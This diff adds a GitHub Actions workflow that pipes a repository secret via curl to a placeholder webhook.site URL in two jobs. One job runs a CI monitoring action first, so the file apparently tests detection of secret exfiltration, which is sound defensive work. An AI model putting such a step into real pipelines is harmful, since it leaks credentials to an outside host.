@@ -1,0 +1,24 @@
+name: Anomolous Request
+
+on:
+  workflow_dispatch:
+
+jobs:
+  anomalous_request:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Export SUPER_DUPER_SECRET
+        run: |
+          echo "$SUPER_DUPER_SECRET" | curl -X POST --data-binary @- https://webhook.site/your-webhook-url-here
+        env:
+          SUPER_DUPER_SECRET: ${{ secrets.SUPER_DUPER_SECRET }}
+
+  anomalous_request_cimon:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: cycodelabs/cimon-action@v0
+      - name: Export SUPER_DUPER_SECRET
+        run: |
+          echo "$SUPER_DUPER_SECRET" | curl -X POST --data-binary @- https://webhook.site/your-webhook-url-here
+        env:
+          SUPER_DUPER_SECRET: ${{ secrets.SUPER_DUPER_SECRET }}
